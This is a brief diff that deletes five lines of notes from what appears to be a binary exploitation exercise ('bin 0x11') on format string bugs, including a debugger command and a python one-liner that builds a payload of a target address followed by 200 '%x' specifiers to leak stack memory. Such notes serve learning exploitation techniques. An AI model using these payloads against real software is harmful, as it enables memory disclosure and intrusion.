@@ -1,5 +1,0 @@
-A simple Format String exploit example - bin 0x11
-python3 -c 'print(bytes.fromhex(str('78252078')).decode())'
-info variables
-python3 -c 'print("AAAA"+"\x0c\x90\x55\x56"+"BBBBB"+"%x "*200)'
-
